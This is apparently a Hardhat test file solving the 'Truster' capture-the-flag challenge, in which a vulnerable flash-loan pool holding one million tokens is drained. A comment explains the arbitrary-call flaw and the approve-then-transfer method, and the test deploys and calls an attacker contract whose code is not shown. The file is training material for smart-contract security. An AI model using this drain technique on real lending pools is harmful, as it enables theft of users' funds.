const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  /**
   * NOTE: TrusterLenderPool is vulnerable to arbitrary calls being made through functionCall.
   * This means that anyone can call any function on any contract with arbitrary parameters.
   * This is a very common vulnerability in smart contracts.
   * We simply need to approve all tokens to our malicious TrustLenderAttacker contract from the pool and transfer it all.
   */
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const trustLenderAttackContract = await ethers.getContractFactory(
      "TrustLenderAttacker",
      player
    );
    const trustLenderAttack = await trustLenderAttackContract.deploy(
      pool.address,
      token.address
    );

    await trustLenderAttack.attack();
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
